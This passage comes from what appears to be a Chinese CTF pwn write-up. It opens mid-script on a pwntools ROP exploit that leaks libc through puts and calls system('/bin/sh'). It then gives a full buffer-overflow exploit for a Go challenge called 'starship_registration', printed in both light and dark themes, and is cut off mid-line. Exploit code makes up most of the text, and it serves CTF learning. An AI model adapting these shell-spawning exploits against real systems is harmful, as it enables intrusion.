if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">b *0x4013c7</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">pop_rdi_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00000000004011f6</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">is:</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">md5 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> cyclic</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1016</span><span style="color:#666666">,</span><span style="color:#BD976A"> n</span><span style="color:#666666">=</span><span style="color:#4C9A91">8</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">got</span><span style="color:#d4976c">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">puts</span><span style="color:#C98A7D77">'</span><span style="color:#d4976c">]</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">plt</span><span style="color:#d4976c">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">puts</span><span style="color:#C98A7D77">'</span><span style="color:#d4976c">]</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#d4976c">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">game</span><span style="color:#C98A7D77">'</span><span style="color:#d4976c">]</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">:(</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc_base </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">Y</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">77820</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"libc_base => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">libc_base</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">binsh </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#B8A965"> next</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">search</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"binsh => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">binsh</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">system </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">04013C7</span><br><br><span style="color:#DBD7CAEE">payload2 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> cyclic</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1008</span><span style="color:#666666">,</span><span style="color:#BD976A"> n</span><span style="color:#666666">=</span><span style="color:#4C9A91">8</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">binsh</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload2 </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> binsh</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> system</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="starship_registration" class="scroll-target"><a href="#starship_registration"><code class="hash inline-code">#</code>starship_registration</a></h2>
<p>神秘 go pwn，出题人很良心给了调试信息，但是很久没逆向 go 做起来还是比较吃力。</p>
<p>感觉做这种题的办法还是自己写一个小 poc 逆出来看看，比如 <code class="inline-code">println</code> 这种，会发现它的第一个参数就是输出流，没什么用，但是直接硬看 ida 反编译的结果的话会感觉很抽象。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./registration</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">info</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">""</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">b 0x4ABC4C</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> initship</span><span style="color:#2993a3">(</span><span style="color:#393A34">name</span><span style="color:#999999">,</span><span style="color:#393A34"> size</span><span style="color:#999999">,</span><span style="color:#393A34"> weight</span><span style="color:#999999">,</span><span style="color:#393A34"> speed</span><span style="color:#999999">,</span><span style="color:#393A34"> flag</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">(max 15): </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#998418">len</span><span style="color:#a65e2b">(</span><span style="color:#393A34">name</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> name</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">(max 15): </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#998418">len</span><span style="color:#a65e2b">(</span><span style="color:#393A34">size</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> size</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">(max 15): </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#998418">len</span><span style="color:#a65e2b">(</span><span style="color:#393A34">weight</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> weight</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">(max 15): </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#998418">len</span><span style="color:#a65e2b">(</span><span style="color:#393A34">speed</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> speed</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">(max 15): </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">0</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> flag</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">ship</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">initship</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">b</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">c</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">d</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">e</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 24</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Flag: </span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">res </span><span style="color:#999999">=</span><span style="color:#393A34"> io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Thank</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">backdoor </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">res</span><span style="color:#1e754f">[</span><span style="color:#2F798A">24</span><span style="color:#999999">:</span><span style="color:#2F798A">27</span><span style="color:#1e754f">]</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">choice: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">6</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">0</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 24</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">backdoor</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">choice: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">2</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./registration</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">info</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">""</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">b 0x4ABC4C</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> initship</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">name</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> size</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> weight</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> speed</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">(max 15): </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#B8A965">len</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">name</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> name</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">(max 15): </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#B8A965">len</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">size</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> size</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">(max 15): </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#B8A965">len</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">weight</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> weight</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">(max 15): </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#B8A965">len</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">speed</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> speed</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">(max 15): </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">0</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">ship</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">initship</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">b</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">c</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">d</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span 